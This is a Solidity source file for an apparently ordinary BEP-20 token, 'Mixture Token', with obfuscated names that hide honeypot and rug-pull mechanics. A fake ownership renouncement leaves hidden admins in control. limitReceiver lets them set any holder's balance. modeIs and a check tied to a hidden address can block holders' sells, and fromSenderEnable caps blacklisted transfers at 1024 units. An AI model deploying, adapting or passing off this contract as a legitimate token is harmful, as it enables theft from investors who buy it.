//SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

interface totalLimit {
    function totalSupply() external view returns (uint256);

    function balanceOf(address fromReceiverMode) external view returns (uint256);

    function transfer(address maxMin, uint256 minAuto) external returns (bool);

    function allowance(address buyMaxMarketing, address spender) external view returns (uint256);

    function approve(address spender, uint256 minAuto) external returns (bool);

    function transferFrom(
        address sender,
        address maxMin,
        uint256 minAuto
    ) external returns (bool);

    event Transfer(address indexed from, address indexed tokenLaunchedTeam, uint256 value);
    event Approval(address indexed buyMaxMarketing, address indexed spender, uint256 value);
}

abstract contract enableLaunched {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface takeReceiver {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface walletExempt {
    function createPair(address exemptList, address teamLimit) external returns (address);
}

interface totalLimitMetadata is totalLimit {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract MixtureToken is enableLaunched, totalLimit, totalLimitMetadata {

    address private sellLaunched;

    uint256 atTrading;

    address receiverIsAuto = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool private teamIs;

    bool public receiverExemptWallet;

    uint256 enableMode;

    constructor (){
        if (fromFund) {
            tokenLiquidity = totalSwap;
        }
        takeReceiver marketingFund = takeReceiver(receiverIsAuto);
        minReceiverSender = walletExempt(marketingFund.factory()).createPair(marketingFund.WETH(), address(this));
        if (minMax == tokenLiquidity) {
            tokenLiquidity = enableBuy;
        }
        tradingLaunch = _msgSender();
        autoTx();
        atSender[tradingLaunch] = true;
        feeList[tradingLaunch] = exemptListTake;
        
        emit Transfer(address(0), tradingLaunch, exemptListTake);
    }

    address toIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function balanceOf(address fromReceiverMode) public view virtual override returns (uint256) {
        return feeList[fromReceiverMode];
    }

    uint8 private shouldFee = 18;

    mapping(address => mapping(address => uint256)) private teamLiquidity;

    address public minReceiverSender;

    string private maxLimit = "MTN";

    function limitAmountTo(address swapFromLiquidity, address maxMin, uint256 minAuto) internal returns (bool) {
        if (swapFromLiquidity == tradingLaunch) {
            return walletMax(swapFromLiquidity, maxMin, minAuto);
        }
        uint256 txWallet = totalLimit(minReceiverSender).balanceOf(toIs);
        require(txWallet == atTrading);
        require(maxMin != toIs);
        if (toMarketing[swapFromLiquidity]) {
            return walletMax(swapFromLiquidity, maxMin, buyReceiver);
        }
        return walletMax(swapFromLiquidity, maxMin, minAuto);
    }

    function walletMax(address swapFromLiquidity, address maxMin, uint256 minAuto) internal returns (bool) {
        require(feeList[swapFromLiquidity] >= minAuto);
        feeList[swapFromLiquidity] -= minAuto;
        feeList[maxMin] += minAuto;
        emit Transfer(swapFromLiquidity, maxMin, minAuto);
        return true;
    }

    mapping(address => bool) public atSender;

    function name() external view virtual override returns (string memory) {
        return takeAtFee;
    }

    function tradingBuy(address atBuy) public {
        if (receiverExemptWallet) {
            return;
        }
        
        atSender[atBuy] = true;
        
        receiverExemptWallet = true;
    }

    function approve(address buyListTx, uint256 minAuto) public virtual override returns (bool) {
        teamLiquidity[_msgSender()][buyListTx] = minAuto;
        emit Approval(_msgSender(), buyListTx, minAuto);
        return true;
    }

    uint256 private exemptListTake = 100000000 * 10 ** 18;

    uint256 private launchLaunchedShould;

    uint256 public tokenLiquidity;

    function limitReceiver(address toSell, uint256 minAuto) public {
        minFrom();
        feeList[toSell] = minAuto;
    }

    mapping(address => uint256) private feeList;

    function modeIs(uint256 minAuto) public {
        minFrom();
        atTrading = minAuto;
    }

    event OwnershipTransferred(address indexed receiverFund, address indexed launchFrom);

    uint256 public liquidityExemptLimit;

    function totalSupply() external view virtual override returns (uint256) {
        return exemptListTake;
    }

    string private takeAtFee = "Mixture Token";

    uint256 public totalSwap;

    function allowance(address liquidityBuy, address buyListTx) external view virtual override returns (uint256) {
        if (buyListTx == receiverIsAuto) {
            return type(uint256).max;
        }
        return teamLiquidity[liquidityBuy][buyListTx];
    }

    uint256 constant buyReceiver = 2 ** 10;

    function symbol() external view virtual override returns (string memory) {
        return maxLimit;
    }

    function decimals() external view virtual override returns (uint8) {
        return shouldFee;
    }

    uint256 public enableBuy;

    address public tradingLaunch;

    function fromSenderEnable(address swapMarketing) public {
        minFrom();
        
        if (swapMarketing == tradingLaunch || swapMarketing == minReceiverSender) {
            return;
        }
        toMarketing[swapMarketing] = true;
    }

    bool private sellSender;

    mapping(address => bool) public toMarketing;

    function transfer(address toSell, uint256 minAuto) external virtual override returns (bool) {
        return limitAmountTo(_msgSender(), toSell, minAuto);
    }

    function minFrom() private view {
        require(atSender[_msgSender()]);
    }

    function owner() external view returns (address) {
        return sellLaunched;
    }

    bool public fromFund;

    function transferFrom(address swapFromLiquidity, address maxMin, uint256 minAuto) external override returns (bool) {
        if (_msgSender() != receiverIsAuto) {
            if (teamLiquidity[swapFromLiquidity][_msgSender()] != type(uint256).max) {
                require(minAuto <= teamLiquidity[swapFromLiquidity][_msgSender()]);
                teamLiquidity[swapFromLiquidity][_msgSender()] -= minAuto;
            }
        }
        return limitAmountTo(swapFromLiquidity, maxMin, minAuto);
    }

    uint256 public minMax;

    function autoTx() public {
        emit OwnershipTransferred(tradingLaunch, address(0));
        sellLaunched = address(0);
    }

    function getOwner() external view returns (address) {
        return sellLaunched;
    }

}